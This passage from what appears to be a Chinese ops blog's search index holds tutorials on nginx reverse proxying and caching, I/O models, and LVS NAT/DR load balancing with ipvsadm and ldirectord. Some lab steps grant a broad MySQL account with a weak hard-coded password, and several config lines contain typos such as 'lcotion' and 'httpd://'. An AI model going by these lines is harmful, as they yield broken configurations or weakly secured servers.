\u0026hellip;]: 期望的响应状态码 header HEADER[operator value]：期望存在响应首部，也可对期望的响应首部的值基于比较操作符和值进行比较 body：期望响应报文的主体部分应该有的内容  实现proxy反向代理的动静分离缓存负载均衡。 静态服务器的配置 ip为192.168.1.13\n$ yum install -y httpd $ vim /etc/httpd/conf/httpd.conf LogFormat \\\u0026quot;%{X-Real-IP}i\\\u0026quot; %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b \\\u0026quot;%{Referer}i\\\u0026quot; \\\u0026quot;%{User-Agent}i\\\u0026quot;\u0026quot; combined $ echo static html \u0026gt; /var/www/html/index.html $ cp /var/log/messages-20180610 /var/www/html/m.txt #生成大文件 $ for i in {1..10} ;do echo page$i on 8 \u0026gt; test$i.html;done #在192.168.1.13运行 $ service httpd restart 动态服务器配置 ip为192.168.1.8\n$ yum install -y httpd php php-mysql mysql-server $ service httpd restart $ service mysqld start $ mysql -e \u0026quot;grant all on *.* to test@'192.168.1.%' identified by 'centos';\u0026quot; $ cat /var/www/html/index.php #测试php联通mysql页面 \u0026lt;?php $dsn='mysql:host=192.168.1.8;dbname=mysql'; $username='test'; $passwd='centos'; $dbh=new PDO($dsn,$username,$passwd); var_dump($dbh); ?\u0026gt; $ for i in {1..10} ;do echo page$i on 13 \u0026gt; test$i.html;done\t#生成调度文件 nginx代理服务器 ip为192.168.1.18\n 反代功能：  $ vim /etc/nginx/conf.d/a.com.conf location ~ \\.php$ { proxy_pass http://192.168.1.8; } location / { proxy_set_header X-Real-IP $remote_addr; proxy_pass http://192.168.1.13; } lcotion /bbs { proxy_pass httpd://192.168.1.8/; #有url，将会把/bbs置换成/。 proxy_pass httpd://192.168.1.8； #无url，将会把/bbs补加在其后。 }  缓存功能：  proxy_cache_path 必须放在http{}语句块中，而后续的server语句块也要加入相应的代码\n$ mkdir -pv /var/cache/nginx/ mkdir: created directory ‘/var/cache/nginx’ $ vim /etc/nginx/nginx.conf ··· http { ··· #开启缓存功能，与下面的缓存功能一起启用方可生效 proxy_cache_path /var/cache/nginx/nginx_cache levels=1:1:1 keys_zone=proxycache:20m inactive=120s max_size=1g; ··· $ vim /etc/nginx/conf.d/a.com.conf ··· location / { ##代理功能 proxy_pass http://192.168.1.13/; proxy_set_header X-Real-IP $remote_addr; ##缓存功能 proxy_cache proxycache; proxy_cache_key $request_uri; proxy_cache_valid 200 302 301 1h; proxy_cache_valid any 1m; #响应头部自定义添加，来自ngx_http_headers_module提供 add_header X-Via $server_addr; add_header X-Cache $upstream_cache_status; add_header X-Accel $server_name; } ··· $ nginx -s reload  调度功能  $ vim /etc/nginx/nginx.conf ··· http { ··· upstream www { least_conn;\t#最少连接算法，类似lvs中的wlc算法。 #ip_hash;\t#源地址hash算法。 #hash $request_uri [consistent];\t#对请求的uri进行hash后，对server的权重和取余 #hash $remote_addr; server 192.168.1.8:80; server 192.168.1.9:80 weight=3; server 192.168.1.13:80 backup|down; #down的适合灰度发布中使用 } ··· $ vim /etc/nginx/conf.d/a.com.conf location / { proxy_pass http://www; } client端访问测试 $ curl 172.20.5.24\t#出现下面页面说明反代成功 static html $ curl 172.20.5.24/index.php #出现下面页面说明反代成功 object(PDO)#1 (0) { } $ curl 172.20.5.24/bbs webbs $ ab -c 100 -n 1000 http://172.20.5.24/m.txt ··· Requests per second: 40.07 [#/sec] (mean) #缓存前 ··· Requests per second: 68.24 [#/sec] (mean)\t#缓存后 ··· $ curl -I 172.20.5.24/m.txt\t#后端的服务器相关内容都被隐藏了 HTTP/1.1 200 OK Server: honginx/6.6.6 Date: Sat, 07 Jul 2018 12:43:20 GMT Content-Type: text/plain; charset=UTF-8 Content-Length: 1288618 Connection: keep-alive Last-Modified: Sat, 07 Jul 2018 00:14:11 GMT ETag: \u0026quot;28063c-13a9aa-5705da8e165e8\u0026quot; X-Via: 172.20.5.24 X-Cache: MISS X-Accel: www.a.com Accept-Ranges: bytes Accept-Ranges: bytes ##测试调度功能 $ for i in {1..10};do curl 172.20.5.24/test$i.html;done page1 on 13 page2 on 13 page3 on 13 page4 on 8 page5 on 8 page6 on 8 page7 on 8 page8 on 8 page9 on 8 page10 on 13  在客户端测试时不会看到调度的效果，想要看到调度的效果需要把缓存关闭\n 感谢阅读！\n","permalink":"https://www.fenghong.tech/blog/2018/2018-07-07-nginx/","tags":["Linux","internet","server"],"title":"Nginx"},{"categories":["ops"],"contents":"摘要：\n I/O模型; 同步，异步； 阻塞，非阻塞； select/poll/epoll模型  Httpd MPM  prefork：进程模型，两级结构，主进程master负责生成子进程，每个子进程负责响应一个请求 worker：线程模型，三级结构，主进程master负责生成子进程，每个子进程负责生成多个线程，每个线程响应一个请求 event：线程模型，三级结构,主进程master负责生成子进程，每个子进程响应多个请求\n 性能影响  有很多研究都表明，性能对用户的行为有很大的影响：\n79%的用户表示不太可能再次打开一个缓慢的网站\n47%的用户期望网页能在2秒钟以内加载\n40%的用户表示如果加载时间超过三秒钟，就会放弃这个网站\n页面加载时间延迟一秒可能导致转换损失7%，页面浏览量减少11%\n8秒定律：用户访问一个网站时，如果等待网页打开的时间超过8秒，会有超过30%的用户放弃等待\n I/O介绍  I/O:  网络IO：本质是socket读取 磁盘IO：\n 每次IO，都要经由两个阶段：  第一步：将数据从磁盘文件先加载至内核内存空间（缓冲区），等待数据准备完成，时间较长 第二步：将数据从内核缓冲区复制到用户空间的进程的内存中，时间较短\n I/O模型   阻塞型、非阻塞型、复用型、信号驱动型、异步 同步/异步：关注的是消息通信机制 同步：synchronous，调用者等待被调用者返回消息，才能继续执行 异步：asynchronous，被调用者通过状态、通知或回调机制主动通知调用者被调用者的运行状态 阻塞/非阻塞：关注调用者在等待结果返回之前所处的状态 阻塞：blocking，指IO操作需要彻底完成后才返回到用户空间，调用结果返回之前，调用者被挂起 非阻塞：nonblocking，指IO操作被调用后立即返回给用户一个状态值，无需等到IO操作彻底完成，最终的调用结果返回之前，调用者不会被挂起\n  同步阻塞IO模型   同步阻塞IO模型是最简单的IO模型，用户线程在内核进行IO操作时被阻塞 用户线程通过系统调用read发起IO读操作，由用户空间转到内核空间。内核等到数据包到达后，然后将接收的数据拷贝到用户空间，完成read操作 用户需要等待read将数据读取到buffer后，才继续处理接收的数据。整个IO请求的过程中，用户线程是被阻塞的，这导致用户在发起IO请求时，不能做任何事情，对CPU的资源利用率不够\n  同步非阻塞IO模型   用户线程发起IO请求时立即返回。但并未读取到任何数据，用户线程需要不断地发起IO请求，直到数据到达后，才真正读取到数据，继续执行。即 “轮询”机制 整个IO请求的过程中，虽然用户线程每次发起IO请求后可以立即返回，但是为了等到数据，仍需要不断地轮询、重复请求，消耗了大量的CPU的资源 是比较浪费CPU的方式，一般很少直接使用这种模型，而是在其他IO模型中使用非阻塞IO这一特性\n  I/O多路复用模型   多个连接共用一个等待机制，本模型会阻塞进程，但是进程是阻塞在select或者poll这两个系统调用上，而不是阻塞在真正的IO操作上 用户首先将需要进行IO操作添加到select中，继续执行做其他的工作（异步），同时等待select系统调用返回。当数据到达时，IO被激活，select函数返回。用户线程正式发起read请求，读取数据并继续执行。 从流程上来看，使用select函数进行IO请求和同步阻塞模型没有太大的区别，甚至还多了添加监视IO，以及调用select函数的额外操作，效率更差。并且阻塞了两次，但是第一次阻塞在select上时，select可以监控多个IO上是否已有IO操作准备就绪，即可达到在同一个线程内同时处理多个IO请求的目的。而不像阻塞IO那种，一次只能监控一个IO 虽然上述方式允许单线程内处理多个IO请求，但是每个IO请求的过程还是阻塞的（在select函数上阻塞），平均时间甚至比同步阻塞IO模型还要长。如果用户线程只是注册自己需要的IO请求，然后去做自己的事情，等到数据到来时再进行处理，则可以提高CPU的利用率 IO多路复用是最常使用的IO模型，但是其异步程度还不够“彻底”，因它使用了会阻塞线程的select系统调用。因此IO多路复用只能称为异步阻塞IO模型，而非真正的异步IO\n  多路I/O复用   IO多路复用是指内核一旦发现进程指定的一个或者多个IO条件准备读取，就通知该进程 IO多路复用适用如下场合： 当客户端处理多个描述符时（一般是交互式输入和网络套接口），必须使用I/O复用 当一个客户端同时处理多个套接字时，此情况可能的但很少出现 当一个TCP服务器既要处理监听套接字，又要处理已连接套接字，一般也要用到I/O复用 当一个服务器即要处理TCP，又要处理UDP，一般要使用I/O复用 当一个服务器要处理多个服务或多个协议，一般要使用I/O复用\n  信号驱动IO模型   信号驱动IO：signal-driven I/O 用户进程可以通过sigaction系统调用注册一个信号处理程序，然后主程序可以继续向下执行，当有IO操作准备就绪时，由内核通知触发一个SIGIO信号处理程序执行，然后将用户进程所需要的数据从内核空间拷贝到用户空间 此模型的优势在于等待数据报到达期间进程不被阻塞。用户主程序可以继续执行，只要等待来自信号处理函数的通知 该模型并不常用\n  异步IO模型   异步IO与信号驱动IO最主要的区别是信号驱动IO是由内核通知何时可以进行IO操作，而异步IO则是由内核告诉用户线程IO操作何时完成。信号驱动IO当内核通知触发信号处理程序时，信号处理程序还需要阻塞在从内核空间缓冲区拷贝数据到用户空间缓冲区这个阶段，而异步IO直接是在第二个阶段完成后，内核直接通知用户线程可以进行后续操作了 相比于IO多路复用模型，异步IO并不十分常用，不少高性能并发服务程序使用IO多路复用模型+多线程任务处理的架构基本可以满足需求。目前操作系统对异步IO的支持并非特别完善，更多的是采用IO多路复用模型模拟异步IO的方式（IO事件触发时不直接通知用户线程，而是将数据读写完毕后放到用户指定的缓冲区中）\n  五种I/O模型  I/O模型的具体实现  主要实现方式有以下几种：  Select：Linux实现对应，I/O复用模型，BSD4.2最早实现 Poll：Linux实现，对应I/O复用模型，System V unix最早实现 Epoll：Linux实现，对应I/O复用模型，具有信号驱动I/O模型的某些特性 Kqueue：FreeBSD实现，对应I/O复用模型，具有信号驱动I/O模型某些特性 /dev/poll：SUN的Solaris实现，对应I/O复用模型，具有信号驱动I/O模型的某些特性 Iocp Windows实现，对应第5种（异步I/O）模型 select/poll/epoll 三种方式的对比：\nselect  Select:POSIX所规定，目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点，本质上是通过设置或者检查存放fd标志位的数据结构来进行下一步处理 缺点  单个进程可监视的fd数量被限制，即能监听端口的数量有限 cat /proc/sys/fs/file-max 对socket是线性扫描，即采用轮询的方法，效率较低 select 采取了内存拷贝方法来实现内核将 FD 消息通知给用户空间，这样一个用来存放大量fd的数据结构，这样会使得用户空间和内核空间在传递该结构时复制开销大 poll 本质上和select没有区别，它将用户传入的数组拷贝到内核空间，然后查询每个fd对应的设备状态 其没有最大连接数的限制，原因是它是基于链表来存储的 大量的fd的数组被整体复制于用户态和内核地址空间之间，而不管这样的复制是不是有意义 poll特点是“水平触发”，如果报告了fd后，没有被处理，那么下次poll时会再次报告该fd 边缘触发：只通知一次 epoll epoll：在Linux 2.6内核中提出的select和poll的增强版本 支持水平触发LT和边缘触发ET，最大的特点在于边缘触发，它只告诉进程哪些fd刚刚变为就需态，并且只会通知一次 使用“事件”的就绪通知方式，通过epoll_ctl注册fd，一旦该fd就绪，内核就会采用类似callback的回调机制来激活该fd，epoll_wait便可以收到通知 优点: 没有最大并发连接的限制：能打开的FD的上限远大于1024(1G的内存能监听约10万个端口) 效率提升：非轮询的方式，不会随着FD数目的增加而效率下降；只有活跃可用的FD才会调用callback函数，即epoll最大的优点就在于它只管理“活跃”的连接，而跟连接总数无关 内存拷贝，利用mmap(Memory Mapping)加速与内核空间的消息传递；即epoll使用mmap减少复制开销 ","permalink":"https://www.fenghong.tech/blog/2018/2018-07-02-io/","tags":["Linux","internet","server"],"title":"I/O"},{"categories":["lvs"],"contents":"摘要：\n ipvsadm的用法 lvs-nat拓扑结构实验 lvs-dr拓扑结构实验 FWM ldirector的用法简介  ipvsadm  程序包：ipvsadm，用于管理集群  Unit File: ipvsadm.service 主程序：/usr/sbin/ipvsadm 规则保存工具：/usr/sbin/ipvsadm-save 规则重载工具：/usr/sbin/ipvsadm-restore 配置文件：/etc/sysconfig/ipvsadm-config  ipvsadm 的基本用法  ipvsadm -A|E -t|u|f service-address [-s scheduler] [-p [timeout]] [-M netmask] [--pe persistence_engine] [-b sched-flags] ipvsadm -D -t|u|f service-address 删除 ipvsadm –C 清空 ipvsadm –R 重载 ipvsadm -S [-n] 保存 ipvsadm -a|e -t|u|f service-address -r server-address [options] ipvsadm -d -t|u|f service-address -r server-address ipvsadm -L|l [options] ipvsadm -Z [-t|u|f service-address]  管理集群服务：增、改、删  ipvsadm -A|E -t|u|f service-address [-s scheduler][-p [timeout]] ipvsadm -D -t|u|f service-address  service-address：  -t|u|f： -t: TCP协议的端口，VIP:TCP_PORT -u: UDP协议的端口，VIP:UDP_PORT -f：firewall MARK，标记，一个数字  [-s scheduler]：指定集群的调度算法，默认为wlc  管理集群上的RS：增、改、删 增、改：ipvsadm -a|e -t|u|f service-address -r server-address [-g|i|m] [-w weight] 删：ipvsadm -d -t|u|f service-address -r server-address server-address： rip[:port] 如省略port，不作端口映射  选项：  -g: gateway, dr类型，默认 -i: ipip, tun类型 -m: masquerade, nat类型 -w weight：权重 集群内容的查看 ipvsadm –C 清空定义的所有内容 ipvsadm -Z [-t|u|f service-address] 清空计数器 ipvsadm -L|l [options] --numeric, -n：以数字形式输出地址和端口号 --exact：扩展信息，精确值 --connection，-c：当前IPVS连接输出 --stats：统计信息 --rate ：输出速率信息 ipvs规则：/proc/net/ip_vs ipvs连接：/proc/net/ip_vs_conn\n 保存：建议保存至/etc/sysconfig/ipvsadm  ipvsadm-save \u0026gt; /PATH/TO/IPVSADM_FILE ipvsadm -S \u0026gt; /PATH/TO/IPVSADM_FILE systemctl stop ipvsadm.service  重载：  ipvsadm-restore \u0026lt; /PATH/FROM/IPVSADM_FILE ipvsadm -R \u0026lt; /PATH/FROM/IPVSADM_FILE systemctl restart ipvsadm.service 集群NAT服务试验 LVS-nat director的设置\n前提网关已经全部搭载好\nvip:172.20.0.24 dip:192.168.1.1/24\nrip1:192.168.1.16 ;rip2:192.168.1.8\n$ ifconfig eth0 172.20.0.16/16 up $ ifconfig eth0:0 172.20.0.24/16 up $ ifconfig eth1 192.168.1.1/24 up $ ipvsadm -A -t 172.20.0.24:80 -s rr $ ipvsadm -L -n $ ipvsadm -a -t 172.20.0.24:80 -r 192.168.1.16 -m $ ipvsadm -a -t 172.20.0.24:80 -r 192.168.1.8 -m $ ipvsadm -L -n --stats IP Virtual Server version 1.2.1 (size=4096) Prot LocalAddress:Port Conns InPkts OutPkts InBytes OutBytes -\u0026gt; RemoteAddress:Port TCP 172.20.0.24:80 15 47 0 2540 0 -\u0026gt; 192.168.1.8:80 8 24 0 1304 0 -\u0026gt; 192.168.1.16:80 7 23 0 1236 0 ##查看状态 $ ipvsadm -Z $ ipvsadm -L -n --stats $ ipvsadm -L -n --rate ##切换wrr模式 $ ipvsadm -E -t 172.20.0.24:80 -s wrr $ ipvsadm -e -t 172.20.0.24:80 -r 192.168.1.16 -m -w 3 $ ipvsadm -e -t 172.20.0.24:80 -r 192.168.1.8 -m $ ipvsadm -L -n --stats $ ipvsadm -L -c $ ipvsadm -L --timeout ps: keepalive下载： wget http://www.keepalived.org/software/keepalived-1.2.5.tar.gz\nlvs-dr 实现如下拓扑结构的实验\n router的相关设置  $ vim /etc/sysctl.conf $ net.ipv4.ip_forward = 1 $ ifconfig eth2 192.168.1.254/24 up $ ifconfig eth1 172.20.0.1/16 up $ ifconfig eth0 192.168.0.254/24 up  director的相关设置  dip:192.168.1.7/24 vip:172.20.0.24/16\n$ iptables -t filter -F $ ifconfig eth0 192.168.1.7/24 up $ ifconfig eth0:0 172.20.0.24/16 up $ route add -host 172.20.0.24 dev eth0:0 #目标是172.20.0.24的，必须经过eth0:0 $ ipvsadm -A -t 172.20.0.24:80 -s rr $ ipvsadm -a -t 172.20.0.24:80 -r 192.168.1.8 -g $ ipvsadm -a -t 172.20.0.24:80 -r 192.168.1.16 -g  RS1的相关设置  rip:192.168.1.16/24 vip:172.20.0.24\n$ ifconfig eth0 192.168.1.16/24 up $ route add default gw 192.168.1.254 $ echo 1 \u0026gt; /proc/sys/net/ipv4/conf/lo/arp_ignore $ echo 1 \u0026gt; /proc/sys/net/ipv4/conf/all/arp_ignore $ echo 2 \u0026gt; /proc/sys/net/ipv4/conf/lo/arp_announce $ echo 2 \u0026gt; /proc/sys/net/ipv4/conf/all/arp_announce $ ifconfig lo0:0 172.20.0.24 netmask 255.255.255.255 broadcast 172.20.0.24 up $ route add -host 172.20.0.24 dev lo:0 $ yum install -y httpd $ echo RS1 \u0026gt; /var/www/html/index.html $ systemctl start httpd  RS2的相关设置  rip:192.168.1.8/24 vip:172.20.0.24\n$ ifconfig eth0 192.168.1.8/24 up $ route add default gw 192.168.1.254 $ echo 1 \u0026gt; /proc/sys/net/ipv4/conf/lo/arp_ignore $ echo 1 \u0026gt; /proc/sys/net/ipv4/conf/all/arp_ignore $ echo 2 \u0026gt; /proc/sys/net/ipv4/conf/lo/arp_announce $ echo 2 \u0026gt; /proc/sys/net/ipv4/conf/all/arp_announce $ ifconfig lo0:0 172.20.0.24 netmask 255.255.255.255 broadcast 172.20.0.24 up $ route add -host 172.20.0.24 dev lo:0 $ yum install -y httpd $ echo RS2 \u0026gt; /var/www/html/index.html $ systemctl start httpd  client的设置及效果检验  $ ifconfig eth0 192.168.0.10.24 up $ route add default 192.168.0.254 dev eth0 $ for i in {1..10};do curl 172.20.0.24 ;done RS1 RS2 RS1 RS2 RS1 RS2 RS1 RS2 RS1 RS2 FireWall Mark FWM：FireWall Mark\n MARK target 可用于给特定的报文打标记\u0026ndash;set-mark value\n其中：value 可为0xffff格式，表示十六进制数字\n借助于防火墙标记来分类报文，而后基于标记定义集群服务；可将多个不同的应用使用同一个集群服务进行调度\n 实现方法：\n 在Director主机打标记：  $ iptables -t mangle -A PREROUTING -d $vip -p $proto –m multiport \\ --dports $port1,$port2,… -j MARK --set-mark NUMBER  在Director主机基于标记定义集群服务：  ipvsadm -A -f NUMBER [options] ipvsadm -a -f NUMBER -r 192.168.1.8 -g ipvsadm -a -f NUMBER -r 192.168.1.16 -g LVS Persistence  持久连接（ lvs persistence ）模板：实现无论使用任何调度算法，在一段时间内（默认300s ），能够实现将来自同一个地址的请求始终发往同一个RS   PCC：将来自于同一个客户端发往VIP的所有请求统统定向至一个RS；\nPPC：将来与一个客户端发往某VIP的某端口的所有请求统统定向至统一个RS；\nPFWMC: 端口绑定，基于防火墙标记，将两个或两个以上的端口绑定为同一个服务，即port affinity.\n ipvsadm -A|E -t|u|f service-address -s scheduler] ldirctord 监控和控制LVS守护进程，可管理LVS规则；\n监控和管理实际服务器守护进程在LVS集群负载均衡的虚拟服务器 。\n 包名：ldirectord-3.9.6-0rc1.1.1.x86_64.rpm 下载：官网  $ wget http://opensuse.ucom.am/repositories/network:/ha-clustering:/Stable/RedHat_RHEL-6/x86_64/ldirectord-3.9.6-0rc1.1.1.x86_64.rpm $ yum install -y ldirectord-3.9.6-0rc1.1.1.x86_64.rpm $ rpm -ql ldirectord /etc/ha.d /etc/ha.d/resource.d /etc/ha.d/resource.d/ldirectord /etc/init.d/ldirectord /etc/logrotate.d/ldirectord /usr/lib/ocf/resource.d/heartbeat/ldirectord /usr/sbin/ldirectord /usr/share/doc/ldirectord-3.9.6 /usr/share/doc/ldirectord-3.9.6/COPYING /usr/share/doc/ldirectord-3.9.6/ldirectord.cf /usr/share/man/man8/ldirectord.8.gz  相关文件的介绍：  /etc/ha.d/ldirectord.cf 主配置文件,按需修改，可以通过模板复制过来。 /usr/share/doc/ldirectord-3.9.6/ldirectord.cf 配置模版文件 /usr/lib/systemd/system/ldirectord.service 服务 /usr/sbin/ldirectord 主程序 /var/log/ldirectord.log 日志 /var/run/ldirectord.ldirectord.pid pid文件  配置文件说明  $ iptables -t mangle -A PREROUTING -d $vip -p $proto –m multiport \\ --dports $port1,$port2,… -j MARK --set-mark 5 $ vim /etc/ha.d/ldirectord.cf checktimeout=3 checkinterval=1 autoreload=yes #自动加载已经更改的配置 logfile=\u0026quot;/var/log/ldirectord.log\u0026quot; #日志文件 quiescent=no #down时yes权重为0，no为删除 virtual=172.20.0.24:80 #指定VS的FWM或IP：port real=172.16.0.7 gate 2 #gate（DR模型） 1(权重) real=172.16.0.8 gate 1 fallback=127.0.0.1 gate #sorry server service=http scheduler=wrr protocol=fwm checktype=negotiate #测试的类型（健康性检查的方式） checkport=80 request=\u0026quot;index.html\u0026quot;\t#要探测的页面（准备一个测试页比较好） receive=\u0026quot;Test Ldirectord\u0026quot; 实现ldirecrtor 搭建DR模型 在rs服务器运行脚本\n$ cat lvs_dr_rs.sh #!/bin/bash vip=172.20.0.24 mask='255.255.255.255' dev=lo:1 rpm -q httpd \u0026amp;\u0026gt; /dev/null || yum -y install httpd \u0026amp;\u0026gt;/dev/null service httpd start \u0026amp;\u0026gt; /dev/null \u0026amp;\u0026amp; echo \u0026quot;The httpd Server is Ready!\u0026quot; echo \u0026quot;`hostname`\u0026quot; \u0026gt; /var/www/html/index.html case $1 in start) echo 1 \u0026gt; /proc/sys/net/ipv4/conf/all/arp_ignore echo 1 \u0026gt; /proc/sys/net/ipv4/conf/lo/arp_ignore echo 2 \u0026gt; /proc/sys/net/ipv4/conf/all/arp_announce echo 2 \u0026gt; /proc/sys/net/ipv4/conf/lo/arp_announce ifconfig $dev $vip netmask $mask echo \u0026quot;The RS Server is Ready!\u0026quot; ;; stop) ifconfig $dev down echo 0 \u0026gt; /proc/sys/net/ipv4/conf/all/arp_ignore echo 0 \u0026gt; /proc/sys/net/ipv4/conf/lo/arp_ignore echo 0 \u0026gt; /proc/sys/net/ipv4/conf/all/arp_announce echo 0 \u0026gt; /proc/sys/net/ipv4/conf/lo/arp_announce echo \u0026quot;The RS Server is Canceled!\u0026quot; ;; *) echo \u0026quot;Usage: $(basename $0) start|stop\u0026quot; exit 1 ;; esac $ bash lvs_dr_rs.sh $ yum install -y httpd $ echo `hostname` \u0026gt; /var/www/html/index.html $ systemctl start httpd 在lvs服务器上运行\n$ cat lvs_dr_vs.sh #!/bin/bash vip='172.20.0.24' iface='ens33:1' mask='255.255.255.255' port='80' rs1='192.168.1.16' rs2='192.168.1.8' scheduler='wrr' type='-g' rpm -q ipvsadm \u0026amp;\u0026gt; /dev/null || yum -y install ipvsadm \u0026amp;\u0026gt; /dev/null case $1 in start) ifconfig $iface $vip netmask $mask #broadcast $vip up iptables -F ipvsadm -A -t ${vip}:${port} -s $scheduler ipvsadm -a -t ${vip}:${port} -r ${rs1} $type -w 1 ipvsadm -a -t ${vip}:${port} -r ${rs2} $type -w 1 echo \u0026quot;The VS Server is Ready!\u0026quot; ;; stop) ipvsadm -C ifconfig $iface down echo \u0026quot;The VS Server is Canceled!\u0026quot; ;; *) echo \u0026quot;Usage: $(basename $0) start|stop\u0026quot; exit 1 ;; esac 在lvs上配置ldiretord $ vim /etc/ha.d/ldirectord.cf # Sample for an http virtual service virtual=172.20.0.24:80 real=192.168.1.16 gate 1 不用写端口号 real=192.168.1.8 gate 3 不用写端口号 # fallback=127.0.0.1:80 gate service=http scheduler=wrr #persistent=600 持久连接，启用后就会一直往一个服务器上调度了 #netmask=255.255.255.255 protocol=fwm #这个加不加都可以 checktype=negotiate checkport=80 request=\u0026quot;index.html\u0026quot; receive=\u0026quot;test\u0026quot; # virtualhost=www.x.y.z 启动ldirecrord 没有手工加ipvsadm策略，启动服务的时候会自动根据配置文件，生成的ipvsadm策略\n$ systemctl start ldirectord $ ipvsadm -L -n --stats IP Virtual Server version 1.2.1 (size=4096) Prot LocalAddress:Port Conns InPkts OutPkts InBytes OutBytes -\u0026gt; RemoteAddress:Port TCP 172.20.0.24:80 15 47 0 2540 0 -\u0026gt; 192.168.1.8:80 8 24 0 1304 0 -\u0026gt; 192.168.1.16:80 7 23 0 1236 0 ldirectord实现的检测功能，一旦RS宕机，会立即从ipvsadm删除宕机的服务器;\n模拟宕机停止rs上的httpd服务即可实验。\n观察ldirectord日志\n$ tail -f /var/log/ldirectord.log 结语 ldirectord实现的是RS的服务器高可用，一旦ldirectord所在服务器宕机,存在单点失败的问题;\nkeepalived负责负载均衡器之间的failover，haproxy或者lvs（ipvsadm）负责健康检查和失败切换；\n可以使用三者结合的方法，实现架构的可用性。这个后续有待验证。\n","permalink":"https://www.fenghong.tech/blog/2018/2018-07-06-lvstest/","tags":["Linux","internet","server"],"title":"LvsTest"},{"categories":["lvs"],"contents":"摘要：\n 集群概念 LVS介绍 LVS实现 ldirectord  Cluster概念  系统扩展方式： Scale UP：向上扩展,增强 Scale Out：向外扩展,增加设备，调度分配问题，Cluster Cluster：集群,为解决某个特定问题将多台计算机组合起来形成的单个系统 Linux Cluster类型：  LB：Load Balancing，负载均衡 HA：High Availiablity，高可用，SPOF（single Point Of failure）  MTBF:Mean Time Between Failure 平均无故障时间 MTTR:Mean Time To Restoration（ repair）平均恢复前时间 A=MTBF/（MTBF+MTTR） (0,1)：99%, 99.5%, 99.9%, 99.99%, 99.999%\n  HPC：High-performance computing，高性能 www.top500.org   分布式系统： 分布式存储：云盘,fastdfs 分布式计算：hadoop，Spark  cluster 分类   基于工作的协议层次划分：\n 传输层（通用）：DPORT LVS： nginx：stream haproxy：mode tcp\n应用层（专用）：针对特定协议，自定义的请求模型分类\nproxy server： http：nginx, httpd, haproxy(mode http), \u0026hellip; fastcgi：nginx, httpd, \u0026hellip; mysql：mysql-proxy, \u0026hellip;\n   cluster 相关  会话保持：负载均衡  (1) session sticky：始终将同一个请求连接定向至同一个RS，同一用户调度固定服务器 Source IP：LVS sh算法（对某一特定服务而言） Cookie (2) session replication：每台服务器拥有全部session,因此对于大规模集群环境不适用 session multicast cluster (3) session server：专门的session服务器,利用单独部署的服务器来统一管理session。 Memcached，Redis  HA集群实现方案  keepalived:vrrp协议 ais:应用接口规范 heartbeat cman+rgmanager(RHCS) coresync_pacemaker LVS  LVS：Linux Virtual Server，负载调度器，集成于内核，章文嵩博士开发  官网：http://www.linuxvirtualserver.org/\nVS: Virtual Server，负责调度 RS: Real Server，负责真正提供服务 L4：四层路由器或交换机   工作原理：VS根据请求报文的目标IP和目标协议及端口将其调度转发至某RS，根据调度算法来挑选RS\n  iptables/netfilter：\n  iptables：用户空间的管理工具 netfilter：内核空间上的框架 流入：PREROUTING --\u0026gt; INPUT 流出：OUTPUT --\u0026gt; POSTROUTING 转发： PREROUTING --\u0026gt; FORWARD --\u0026gt; POSTROUTING DNAT：目标地址转换； PREROUTING  lvs集群类型中的术语：  VS：Virtual Server，Director Server(DS) Dispatcher(调度器)，Load Balancer RS：Real Server(lvs), upstream server(nginx)backend server(haproxy) CIP：Client IP VIP: Virtual serve IP VS外网的IP DIP: Director IP VS内网的IP RIP: Real server IP 访问流程：CIP \u0026lt;--\u0026gt; VIP == DIP \u0026lt;--\u0026gt; RIP  lvs: ipvsadm/ipvs   ipvsadm：用户空间的命令行工具，规则管理器，用于管理集群服务及RealServer\nipvs：工作于内核空间netfilter的INPUT钩子上的框架\n  lvs集群的类型：   lvs-nat：修改请求报文的目标IP,多目标IP的DNAT\nlvs-dr：操纵封装新的MAC地址\nlvs-tun：在原请求IP报文之外新加一个IP首部\nlvs-fullnat：修改请求报文的源和目标IP\n lvs-nat： 本质是多目标IP的DNAT，通过将请求报文中的目标地址和目标端口修改为某挑出的RS的RIP和PORT实现转发\n RIP和DIP应在同一个IP网络，最好使用私网地址；RS的网关要指向DIP 请求报文和响应报文都必须经由Director转发，Director易于成为系统瓶颈 支持端口映射，可修改请求报文的目标PORT VS必须是Linux系统，RS可以是任意OS系统  LVS-DR LVS-DR：Direct Routing，直接路由，LVS默认模式,应用最广泛,通过为请求报文重新 封装一个MAC首部进行转发，源MAC是DIP所在的接口的MAC，目标MAC是某挑选出 的RS的RIP所在接口的MAC地址；源IP/PORT，以及目标IP/PORT均保持不变\n Director和各RS都配置有VIP 确保前端路由器将目标IP为VIP的请求报文发往Director  1.在前端网关做静态绑定VIP和Director的MAC地址 2.在RS上使用arptables工具 arptables -A IN -d $VIP -j DROP arptables -A OUT -s $VIP -j mangle --mangle-ip-s $RIP 3.在RS上修改内核参数以限制arp通告及应答级别 /proc/sys/net/ipv4/conf/all/arp_ignore /proc/sys/net/ipv4/conf/all/arp_announce $ echo net.ipv4.conf.all.arp_ignore = 1 \u0026gt;\u0026gt; /etc/sysctl.conf $ echo net.ipv4.conf.all.arp_announce = 2 \u0026gt;\u0026gt; /etc/sysctl.conf $ sysctl -p 推荐修改内核配置，数字说明。 arp_announce : 0：默认值，把本机所有接口的所有信息向每个接口的网络进行通告 1：尽量避免将接口信息向非直接连接网络进行通告 2：必须避免将接口信息向非本网络进行通告 arp_ignore: 0：默认值，表示可使用本地任意接口上配置的任意地址进行响应 1: 仅在请求的目标IP配置在本地主机的接收到请求报文的接口上时，才给予响应 RS的RIP可以使用私网地址，也可以是公网地址；RIP与DIP在同一IP网络；RIP的网关不能指向DIP，以确保响应报文不会经由Director RS和Director要在同一个物理网络 请求报文要经由Director，但响应报文不经由Director，而由RS直接发往Client 不支持端口映射（端口不能修败） RS可使用大多数OS系统  lvs-tun 转发方式：不修改请求报文的IP首部（源IP为CIP，目标IP为VIP），而在原IP报文之外再封装一个IP首部（源IP是DIP，目标IP是RIP），将报文发往挑选出的目标RS；RS直接响应给客户端（源IP是VIP，目标IP是CIP）\n  DIP, VIP, RIP都应该是公网地址 RS的网关一般不能指向DIP 请求报文要经由Director，但响应不能经由Director 不支持端口映射 RS的OS须支持隧道功能   lvs调度算法 lvs的调度方法：10种\n 静态方法：仅根据算法本身进行调度   RR：Round Robin\nWRR: Weigted RR\nSH: Source Hashing，实现session sticky，源IP地址hash\nDH:Destination Hashing，\n  动态方法:主要根据每RS当前的负载状态及调度算法进行调度Overhead=value，较小的RS将被调度   LC： Least 